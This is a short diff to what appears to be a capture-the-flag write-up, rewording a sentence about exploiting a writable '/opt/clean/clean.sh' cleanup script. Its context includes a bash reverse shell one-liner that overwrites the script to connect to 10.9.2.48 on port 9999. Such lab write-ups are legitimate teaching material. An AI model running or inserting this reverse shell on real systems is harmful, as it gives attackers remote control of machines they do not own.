@@ -209,7 +209,7 @@ After some waste of time I ran a linpeas script to make sure everything didn't m
 
 When I went to the “/opt/clean” location, there was a “clean.sh” script in there. It cleaned the “/tmp” directory completely.
 
-Let's hope into the **opt** directory and try to execute a rev shell and setup a nc listener. This was my revshell :
+Let's try to execute a rev shell and setup a nc listener. This was my revshell :
 ```
 echo "bash -i >& /dev/tcp/10.9.2.48/9999 0>&1" > clean.sh
 ```
